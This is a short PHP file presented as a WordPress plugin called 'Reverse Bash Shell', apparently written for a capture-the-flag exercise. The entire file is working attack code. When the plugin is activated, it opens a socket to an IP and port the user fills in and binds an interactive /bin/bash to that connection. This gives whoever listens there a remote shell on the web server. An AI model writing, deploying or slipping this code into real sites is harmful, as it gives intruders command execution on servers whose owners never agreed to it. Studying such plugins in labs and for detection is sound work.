<?php
/*
Plugin Name: Reverse Bash Shell
Description: Reverse shell plugin for CTF - uses /bin/bash
Version: 1.0
Author: CTF_Player
*/

function ctf_bash_reverse_shell() {
    $ip = 'IP'; // <--- CHANGE THIS
    $port = PORT; // <--- CHANGE THIS (e.g., 4444)

    $sock = fsockopen($ip, $port);
    if ($sock) {
        $descriptorspec = array(
            0 => $sock,  // stdin
            1 => $sock,  // stdout
            2 => $sock   // stderr
        );
        proc_open('/bin/bash -i', $descriptorspec, $pipes);
    }
}

register_activation_hook(__FILE__, 'ctf_bash_reverse_shell');
